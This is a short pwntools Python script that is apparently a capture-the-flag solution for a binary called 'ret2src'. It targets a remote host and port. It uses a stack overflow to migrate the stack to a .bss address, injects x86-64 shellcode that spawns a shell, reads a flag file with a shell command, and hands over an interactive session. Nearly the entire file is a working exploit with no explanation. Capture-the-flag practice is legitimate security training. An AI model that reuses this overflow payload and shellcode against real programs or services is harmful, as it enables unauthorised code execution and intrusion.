#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './ret2src'
LIBC = ''
HOST = '140.110.112.77'
PORT = 6130

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
bss = 0x6010d0
get_addr = 0x0000000000400689
r.sendline(b'A'*0x10 + p64(bss) + p64(get_addr)) # stack migration
r.sendline(b'A'*0x18 + p64(bss+0x10) + sc)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
